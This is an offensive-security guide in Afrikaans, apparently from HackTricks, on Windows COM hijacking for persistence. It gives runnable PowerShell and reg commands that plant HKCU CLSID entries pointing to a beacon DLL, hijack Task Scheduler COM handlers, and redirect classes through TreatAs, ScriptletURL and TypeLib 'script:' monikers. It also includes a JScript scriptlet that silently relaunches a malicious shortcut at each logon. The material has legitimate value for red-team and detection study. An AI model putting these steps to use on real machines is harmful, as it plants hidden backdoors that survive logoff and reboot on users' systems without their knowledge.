# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Soek na nie-bestaande COM-komponente

Aangesien gebruikers die waardes van HKCU kan wysig, kan **COM Hijacking** as 'n **volhardingsmeganisme** gebruik word. Met `procmon` is dit maklik om gezochte COM-registrasies te vind wat nog nie bestaan nie en deur 'n aanvaller geskep kan word. Klassieke filters:

- **RegOpenKey** operasies.
- waar die _Result_ **NAME NOT FOUND** is.
- en die _Path_ eindig met **InprocServer32**.

Nuttige variasies tydens soektog:

- Kyk ook na ontbrekende **`LocalServer32`**-sleutels. Sommige COM-klasse is out-of-process servers en sal 'n deur 'n aanvaller beheerde EXE begin in plaas van 'n DLL.
- Soek na **`TreatAs`** en **`ScriptletURL`** register-operasies benewens `InprocServer32`. Onlangse deteksie-inhoud en malware-skrywings wys hierop omdat hulle baie minder algemeen as normale COM-registrasies is en dus 'n hoë-signaal bied.
- Kopieer die wettige **`ThreadingModel`** vanaf die oorspronklike `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` wanneer jy 'n registrasie in HKCU kloon. Om die verkeerde model te gebruik breek dikwels aktivering en maak die hijack lawaaierig.
- Op 64-bit stelsels inspekteer beide 64-bit en 32-bit aansigte (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` en `HKLM\Software\Classes\WOW6432Node`) omdat 32-bit toepassings 'n ander COM-registrasie kan oplos.

Sodra jy besluit het watter nie-bestaande COM jy wil nadoen, voer die volgende opdragte uit. _Wees versigtig as jy besluit om 'n COM na te boots wat elke paar sekondes gelaai word, want dit kan oordrewe wees._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Kaapbare Task Scheduler COM components

Windows Tasks gebruik Custom Triggers om COM objects aan te roep en omdat hulle deur die Task Scheduler uitgevoer word, is dit makliker om te voorspel wanneer hulle geaktiveer sal word.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Deur die uitset te kontroleer kan jy byvoorbeeld een kies wat elke keer **wanneer 'n gebruiker aanmeld** uitgevoer sal word.

Nou, as jy die CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\CLASSES\ROOT\CLSID** en in HKLM en HKCU soek, sal jy gewoonlik vind dat die waarde nie in HKCU bestaan nie.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Dan kan jy net die HKCU entry skep en elke keer wanneer die gebruiker aanmeld, sal jou backdoor geaktiveer word.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` laat toe dat een CLSID deur 'n ander nageboots word. Vanuit 'n offensiewe perspektief beteken dit jy kan die oorspronklike CLSID ongemoeid laat, 'n tweede per-gebruiker CLSID skep wat na `scrobj.dll` verwys, en dan die werklike COM-objek herlei na die kwaadwillige een met `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Dit is nuttig wanneer:

- die doeltoepassing reeds 'n stabiele CLSID instansieer by aanmelding of by app-start
- jy 'n slegs-register-omleiding wil hê in plaas daarvan om die oorspronklike `InprocServer32` te vervang
- jy 'n plaaslike of afgeleë `.sct` scriptlet deur die `ScriptletURL`-waarde wil uitvoer

Voorbeeldwerkstroom (aangepas vanaf die openbare Atomic Red Team tradecraft en ouer COM registry abuse navorsing):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Aantekeninge:

- `scrobj.dll` lees die `ScriptletURL`-waarde en voer die verwysde `.sct` uit, so jy kan die payload as 'n plaaslike lêer hou of dit vanaf 'n afstand oor HTTP/HTTPS laai.
- `TreatAs` is veral handig wanneer die oorspronklike COM-registrasie volledig en stabiel in HKLM is, omdat jy net 'n klein per-gebruiker-omleiding nodig het in plaas daarvan om die hele boom te weerspieël.
- Vir validering sonder om op die natuurlike trigger te wag, kan jy die valse ProgID/CLSID handmatig instansieer met `rundll32.exe -sta <ProgID-or-CLSID>` as die teikenklas STA-aktivering ondersteun.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definieer COM-koppelvlakke en word via `LoadTypeLib()` gelaai. Wanneer 'n COM-server geïnstansieer word, kan die OS ook die geassosieerde TypeLib laai deur registersleutels onder `HKCR\TypeLib\{LIBID}` te raadpleeg. As die TypeLib-pad vervang word met 'n **moniker**, bv. `script:C:\...\evil.sct`, sal Windows die scriptlet uitvoer wanneer die TypeLib opgelos word — wat 'n sluipende persistentie tot gevolg het wat ontlok word wanneer algemene komponente gebruik word.

Dit is waargeneem teen die Microsoft Web Browser control (wat gereeld deur Internet Explorer, apps wat WebBrowser inbed, en selfs `explorer.exe` gelaai word).

### Stappe (PowerShell)

1) Identifiseer die TypeLib (LIBID) wat deur 'n hoogfrekwensie CLSID gebruik word. Voorbeeld CLSID wat dikwels deur malware-kettings misbruik word: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Rig die per-gebruiker TypeLib-pad na 'n plaaslike scriptlet deur die `script:` moniker te gebruik (geen administrateurregte benodig nie):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Drop 'n minimale JScript `.sct` wat jou primêre payload herbegin (bv. 'n `.lnk` wat deur die aanvanklike ketting gebruik word):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Aktivering – om IE te open, 'n toepassing wat die WebBrowser control ingebed het, of selfs gewone Explorer-aktiwiteit sal die TypeLib laai en die scriptlet uitvoer, en jou ketting weer aktiveer by aanmelding/herbegin.

Opruiming
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Aantekeninge
- Jy kan dieselfde logika op ander hoë-frekwensie COM-komponente toepas; bepaal altyd eers die werklike `LIBID` by `HKCR\CLSID\{CLSID}\TypeLib`.
- Op 64-bit stelsels kan jy ook die `win64` subkey vir 64-bit verbruikers vul.

## Verwysings

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
